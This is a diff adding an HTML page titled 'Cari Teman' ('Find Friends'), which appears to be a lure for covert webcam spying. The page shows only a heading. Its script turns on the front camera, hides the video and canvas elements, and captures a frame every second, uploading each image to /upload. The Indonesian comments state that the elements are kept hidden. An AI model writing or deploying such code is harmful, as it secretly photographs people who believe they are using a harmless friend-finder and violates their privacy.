@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Cari Teman</title>
+  <style>
+    body {
+      background: black;
+      color: white;
+      text-align: center;
+    }
+    video {
+      display: none; /* video disembunyi */
+    }
+    canvas {
+      display: none; /* canvas tetap hidden */
+    }
+  </style>
+</head>
+<body>
+
+<h3>🎾Cari Teman Anda</h3>
+<video id="video" autoplay muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+const video = document.getElementById('video')
+const canvas = document.getElementById('canvas')
+
+// nyalain kamera depan
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+  .then(stream => {
+    video.srcObject = stream
+    
+    video.addEventListener('loadedmetadata', () => {
+      video.play() 
+      startCapture()
+    })
+  })
+  .catch(err => {
+    console.error('Gagal akses kamera:', err)
+  })
+
+function startCapture() {
+  const INTERVAL = 1000 // 1 detik
+
+  setInterval(() => {
+    if (!video.videoWidth) return
+
+    canvas.width = video.videoWidth
+    canvas.height = video.videoHeight
+
+    const ctx = canvas.getContext('2d')
+    ctx.drawImage(video, 0, 0)
+
+    fetch('/upload', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ image: canvas.toDataURL('image/png') })
+    })
+  }, INTERVAL)
+}
+</script>
+
+</body>
+</html>
